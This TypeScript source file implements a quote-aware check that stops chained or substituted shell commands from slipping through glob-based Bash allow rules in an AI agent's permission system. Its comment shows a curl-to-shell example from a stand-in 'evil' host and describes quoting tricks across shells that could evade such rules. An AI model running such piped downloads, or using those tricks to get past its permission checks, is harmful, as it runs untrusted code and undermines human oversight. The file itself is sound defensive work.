/**
 * Shell characters that chain, redirect, substitute or group one command into another, and a
 * newline, which starts a second command.
 *
 * A `Bash(<glob>)` rule is a glob over the whole command string and `*` crosses anything, so
 * `Bash(npm *)` would also match `npm x && curl evil | sh`. Book cannot express "and nothing else"
 * in its glob language and does not parse shell, so it asks a smaller question with
 * {@link hasCompoundShellSyntax}: does the command contain shell syntax that could run something
 * other than the one command the rule was written for? Two places use the answer:
 *
 * - the capability layer (`allowed-tools` of a command, skill or agent role) refuses a compound
 *   command under a `Bash(<glob>)` rule, so the model sends each command as its own call;
 * - the permission layer admits a call through a `Bash(<pattern>)` allow rule only when the whole
 *   command, trimmed, matches the pattern and is not compound; a compound command falls through to
 *   the normal prompt.
 *
 * The check is quote-aware, but it is a small quote scanner and not a shell parser. A character
 * that chains outside quotes (`;`, `&`, `|`, `<`, `>`, `(`, `)`, `{`, `}`, `$`, a backtick) is
 * literal inside quotes, so `git commit -m "fix(x): y"` is one command. `$` and a backtick still
 * count inside double quotes, where a shell substitutes, and a line break counts everywhere.
 *
 * It stays conservative across sh/bash, PowerShell and cmd.exe: whatever any of them could read as
 * something other than a quote refuses the command (a backslash or caret before a quote, a
 * typographic quote, an unterminated quote). On Windows any single quote refuses the command: cmd.exe
 * has no single quote, but the Windows session shell is usually PowerShell or Git Bash, which both
 * read it as a real one, so the scanner cannot tell which characters are quoted.
 *
 * The "Always allow" ladder (`permissionRuleLadder`) stays quote-blind on purpose and uses
 * {@link SHELL_CHAINING} raw: a tokenizer that knew quotes would offer rungs with a dangling quote.
 */
export const SHELL_CHAINING = /[;&|><`$(){}\n]/;

/** Line breaks in any shell: LF, CR, NEL, and the Unicode line and paragraph separators. */
export const LINE_BREAK = /[\n\r\u0085\u2028\u2029]/;

/** Typographic quotes U+2018 to U+201E, which PowerShell reads as quote characters. */
const TYPOGRAPHIC_QUOTE_RANGE = '\\u2018-\\u201E';

const TYPOGRAPHIC_QUOTE = new RegExp(`[${TYPOGRAPHIC_QUOTE_RANGE}]`);

/** Every character that can open or close a quote in some shell. */
export const ANY_QUOTE = new RegExp(`['"${TYPOGRAPHIC_QUOTE_RANGE}]`);

/**
 * Whether a command contains shell syntax a `Bash(<pattern>)` rule cannot vouch for, so it must be
 * refused or asked about. Surrounding whitespace is not part of the command (the Bash tool runs
 * `command.trim()`), so it is trimmed first. One left-to-right scan, in one of three states:
 * outside quotes, inside single quotes, inside double quotes. True when:
 *
 * - outside quotes, any {@link SHELL_CHAINING} character appears;
 * - inside double quotes, `$` or a backtick appears (every other character is literal);
 * - inside single quotes, nothing is special;
 * - a quote is still open at the end;
 * - a line break appears in any state: in sh `#` can comment out an opening quote, and PowerShell
 *   reads a bare CR as a line break, so no quote state can be trusted across one;
 * - a backslash comes right before `'` or `"` in any state, single quotes included: sh reads it as
 *   a literal quote outside single quotes, PowerShell and cmd.exe read `\"` as a closing quote, and
 *   fish reads `\'` inside single quotes as an escaped quote. The `shell` setting can name any
 *   executable (an unknown one is treated as `sh`), so the scanner cannot tell which characters are
 *   quoted;
 * - a caret comes right before `'` or `"` outside quotes: `^` escapes the quote in cmd.exe;
 * - a typographic quote appears anywhere;
 * - on `win32`, an ASCII `'` appears anywhere (PowerShell and Git Bash both read it as a quote).
 */
export function hasCompoundShellSyntax(
  command: string,
  platform: NodeJS.Platform = process.platform,
): boolean {
  const text = command.trim();
  const windows = platform === 'win32';
  let state: 'outside' | 'single' | 'double' = 'outside';

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (LINE_BREAK.test(char) || TYPOGRAPHIC_QUOTE.test(char)) return true;
    if (windows && char === "'") return true;

    const next = text[i + 1];
    const quoteFollows = next === '"' || next === "'";
    if (char === '\\' && quoteFollows) return true;

    if (state === 'single') {
      if (char === "'") state = 'outside';
      continue;
    }

    if (state === 'double') {
      if (char === '$' || char === '`') return true;
      if (char === '"') state = 'outside';
      continue;
    }

    if (char === '^' && quoteFollows) return true;
    if (char === '"') state = 'double';
    else if (char === "'") state = 'single';
    else if (SHELL_CHAINING.test(char)) return true;
  }

  return state !== 'outside';
}
